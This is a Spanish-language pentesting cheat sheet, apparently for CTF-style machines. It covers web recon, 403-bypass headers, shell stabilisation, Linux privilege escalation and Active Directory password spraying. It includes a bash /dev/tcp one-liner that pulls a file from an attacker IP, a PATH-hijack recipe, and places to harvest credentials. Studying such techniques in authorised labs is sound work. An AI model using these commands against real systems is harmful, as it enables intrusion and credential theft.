# Trucos y Atajos poco Conocidos

Colección de trucos que ahorran tiempo y desatascan máquinas, del tipo que no suele estar en las guías de principiante y que aprendes "a base de horas". Úsalos cuando lo estándar no avanza.

> Son complementos a la [metodología](./Metodolog%C3%ADa%20de%20Pentesting.md) y a la [mentalidad para máquinas difíciles](./Mentalidad%20para%20M%C3%A1quinas%20Dif%C3%ADciles.md). Siempre en entornos autorizados.

---

## Reconocimiento y web

- **`/etc/hosts` casi siempre.** Si una web redirige a un nombre o el certificado TLS menciona un dominio, añádelo. Muchísimas máquinas "no dan nada" solo porque no resuelves el vhost.
- **Mira el certificado TLS**: `openssl s_client -connect IP:443` revela nombres de dominio, correos y subdominios internos.
- **`.git` expuesto = código fuente gratis.** Si existe `/.git/`, descárgalo con `git-dumper` y tendrás el código (y a menudo credenciales en el historial de commits).
- **Fuzzea con barra final y sin ella.** `/admin` puede dar 301 y `/admin/` 200. Y prueba mayúsculas (`/Admin`).
- **El 403 es un "sí, existe".** Un `403 Forbidden` confirma que el recurso existe; prueba bypass: `/admin/.`, `/admin//`, `/%2e/admin`, cabecera `X-Original-URL: /admin`, `X-Forwarded-For: 127.0.0.1`.
- **robots.txt y sitemap** listan rutas que el creador quería "ocultar": ve directo a ellas.
- **wappalyzer / whatweb primero.** Saber la tecnología te dice qué extensiones fuzzear y qué exploits mirar.

> **Consejo:** cuando un fuzzing devuelve montones de 200 falsos, filtra por **tamaño** o **palabras** (`-fs`, `-fw` en ffuf), no por código. Es la diferencia entre ruido inútil y hallazgos reales.

---

## Shells y comodidad

- **Spawn de TTY en una línea**: `script /dev/null -c bash` es más fiable que el truco de Python en sistemas raros.
- **Si pierdes la shell constantemente**, usa `tmux` en tu máquina para no perder el listener, y considera `pwncat-cs` (reconecta y estabiliza solo).
- **Shell que "se cuelga" con binarios interactivos** (ftp, mysql, su): usa `python3 -c 'import pty;pty.spawn("/bin/bash")'` ANTES, o llama al binario con sus flags no interactivas.
- **`ldd`/sin internet**: compila exploits de kernel con `gcc -static` cuando la víctima no tiene librerías.
- **No tienes `wget`/`curl` en la víctima**: usa `/dev/tcp` de bash para descargar:
  ```bash
  exec 3<>/dev/tcp/<TU_IP>/80; echo -e "GET /f HTTP/1.0\r\n\r" >&3; cat <&3
  ```

---

## Escalada de privilegios (los que más desatascan)

- **`sudo -l` sin contraseña a veces funciona** aunque no sepas la del usuario; pruébalo siempre primero.
- **GTFOBins es la respuesta** a casi cualquier SUID/sudo/capability. No pienses: busca el binario ahí.
- **`find` con `-newermt`**: encuentra archivos modificados recientemente (pistas del creador):
  ```bash
  find / -newermt "2024-01-01" ! -newermt "2025-01-01" -type f 2>/dev/null | grep -v /proc
  ```
- **`pspy` para cron invisibles**: muchos cron que corren como root no están en `/etc/crontab` sino lanzados por scripts; `pspy` los caza sin ser root.
- **Grupos olvidados**: `id` → `docker`, `lxd`, `disk`, `adm` son root casi directo. La gente mira SUID y olvida los grupos.
- **Variable `$PATH` escribible + script con comando relativo** = secuestro de binario. Si un script SUID llama a `service` sin ruta, crea tu `service` malicioso y antepón tu directorio al PATH.
- **Credenciales por todas partes**: `history`, `.bash_history`, `.mysql_history`, `/var/backups`, `/opt`, variables de entorno (`env`), y la memoria (`strings /proc/<pid>/environ`).

> **Consejo (poco conocido):** antes de pelear con un exploit de kernel, ejecuta `sudo -l`, `getcap -r / 2>/dev/null` y revisa `/opt` y `/home/*`. Los exploits de kernel son el **último** recurso: ruidosos, poco fiables y cuelgan la máquina. El 80 % de las escaladas son config, no kernel.

---

## Active Directory

- **La hora.** Si Kerberos falla "sin motivo": `sudo ntpdate <DC>` o `faketime`. Es el error nº1.
- **Resolución del dominio.** Añade `dominio.local` y `dc01.dominio.local` a `/etc/hosts`; muchos ataques fallan solo por DNS.
- **Password spraying inteligente**: prueba `Nombremes+año` (`Verano2024`, `Empresa2024!`), el nombre de la empresa, `Welcome1`, y el propio usuario como contraseña. Respeta la política de bloqueo (`--continue-on-success` y pocas pruebas).
- **`description` de los usuarios** (LDAP/rpcclient): contraseñas puestas por admins perezosos. Clásico y letal.
- **Reutiliza TODO**: una credencial de un servicio (SQL, web) suele valer para un usuario del dominio. Pásala por `netexec smb/winrm/ldap` contra toda la red.

---

## Generales

- **Dos monitores / tmux en paneles**: notas a un lado, terminal al otro. La productividad sube muchísimo.
- **`searchsploit -m <id>`** copia el exploit a tu carpeta; léelo **entero** antes de ejecutar (cambia IP/puerto, entiende qué hace).
- **Google con comillas y versión exacta**: `"Nombre 2.3.4" exploit` / `CVE`. Y GitHub: muchos PoCs solo están ahí.
- **Si algo parece fuera de lugar, lo está.** Un puerto no estándar, un nombre raro, un comentario: los creadores dejan migas a propósito.

> **Consejo final:** guarda tus propios trucos aquí a medida que los descubras. Tu cuaderno personal de atajos, con las cosas que TÚ olvidas, vale más que cualquier chuleta genérica. Este documento es el punto de partida; hazlo tuyo.
